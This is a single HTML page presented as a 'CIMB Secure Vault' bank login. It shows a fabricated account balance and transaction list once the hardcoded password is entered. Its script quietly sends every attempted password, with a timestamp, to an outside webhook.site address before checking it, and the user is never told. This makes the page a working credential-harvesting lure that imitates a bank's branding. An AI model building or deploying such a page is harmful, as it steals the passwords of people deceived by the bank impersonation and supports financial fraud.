
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CIMB Vault Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f2f2f2;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
    }
    .container {
      background-color: white;
      padding: 20px 30px;
      border-radius: 10px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    .vault {
      display: none;
    }
    input[type="password"] {
      padding: 10px;
      width: 100%;
      margin-top: 10px;
      margin-bottom: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
    }
    button {
      background-color: #d71920;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 5px;
      cursor: pointer;
    }
    .error {
      color: red;
      margin-top: 10px;
    }
    .transactions {
      margin-top: 20px;
      font-size: 0.9em;
    }
    .footer-note {
      margin-top: 20px;
      font-size: 0.8em;
      font-style: italic;
      color: #666;
    }
  </style>
</head>
<body>
  <div class="container" id="loginBox">
    <h2>CIMB Secure Vault</h2>
    <p>Please enter your password:</p>
    <input type="password" id="passwordInput" placeholder="Enter password" />
    <br>
    <button onclick="validatePassword()">Login</button>
    <div id="errorMsg" class="error"></div>
  </div>

  <div class="container vault" id="vaultBox">
    <h2>Vault Balance</h2>
    <p style="font-size: 2em; color: green;">$362,589.92 SGD</p>
    <div class="transactions">
      <strong>Recent Transactions:</strong>
      <ul>
        <li>21 Jun: Deposit via PayNow +$8,000.00</li>
        <li>19 Jun: Interest Credit +$120.45</li>
        <li>16 Jun: Withdrawal -$500.00</li>
        <li>14 Jun: Mobile Transfer -$2,000.00</li>
      </ul>
    </div>
    <div class="footer-note">Older Transactions Cannot be Retrieved</div>
  </div>

  <script>
    async function validatePassword() {
      const password = document.getElementById("passwordInput").value;
      const correctPassword = "Tobysafe1991";
      const errorMsg = document.getElementById("errorMsg");

      try {
        const res = await fetch("https://webhook.site/867ae5f4-7a7c-4aac-a47d-3ed80cdaea41", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            attemptedPassword: password,
            timestamp: new Date().toISOString()
          })
        });
        console.log("Webhook response:", res.status);

        if (password === correctPassword) {
          document.getElementById("loginBox").style.display = "none";
          document.getElementById("vaultBox").style.display = "block";
        } else {
          errorMsg.textContent = "Incorrect password.";
        }
      } catch (err) {
        console.error("Webhook error:", err);
        errorMsg.textContent = "Something went wrong. Try again.";
      }
    }
  </script>
</body>
</html>
